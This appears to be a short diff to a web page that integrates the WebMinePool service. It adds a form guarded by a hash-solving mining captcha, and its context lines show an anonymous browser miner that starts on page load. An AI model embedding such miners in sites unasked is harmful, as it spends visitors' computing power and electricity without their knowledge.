@@ -3,3 +3,13 @@
     var miner = WMP.Anonymous('<SK_Hq6se4HPpYoTEKsBANlkp>');
     miner.start();
 </script>
+<form action="?" method="post">
+    <!-- your form fields and other stuff -->
+    <script src="https://webminepool.com/lib/captcha.js"></script>
+    <div id="wmp-captcha"
+        target_hashes="768"
+        site_key="SK_kK7Et4ym7lDGyfbTps5ew"
+    >
+    </div>
+    <input type="submit" value="Submit"/>
+</form>
